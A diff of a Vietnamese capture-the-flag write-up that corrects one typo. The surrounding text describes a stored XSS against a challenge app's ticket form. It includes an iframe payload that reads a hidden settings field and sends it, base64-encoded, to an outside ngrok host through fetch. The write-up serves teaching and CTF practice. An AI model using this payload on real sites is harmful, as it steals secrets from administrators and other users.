@@ -14,7 +14,7 @@ và sau đó con bot sẽ tiến hành truy cập đến đường dẫn __/tick
 khi vào đường dẫn __/tickets__  này, sẽ hiện thị ra toàn bộ dữ liệu trong table __tickets__ 
 ![](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_blink_host/src/2.png)
 
-bây giờ ta chỉ cần chèn mã script vào bất kỳ trường __name, email, website, message__ trong gói json gửi lên __/api/submit_ticket__   để thực hiện XSS yêu cầu con bot truy cập đến đường dẫn __/settings__ trên web và truy xuất đến thẻ input thứ 5 lấy value cũng chính là glag gửi flag về máy mình
+bây giờ ta chỉ cần chèn mã script vào bất kỳ trường __name, email, website, message__ trong gói json gửi lên __/api/submit_ticket__   để thực hiện XSS yêu cầu con bot truy cập đến đường dẫn __/settings__ trên web và truy xuất đến thẻ input thứ 5 lấy value cũng chính là flag gửi flag về máy mình
 ``` 
 <iframe id="iframetrung" src="settings" onload=fetch("http://027d-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/?flag="+btoa(document.getElementById('iframetrung').contentWindow.document.getElementsByTagName("input")[4].value)); >
 </iframe>
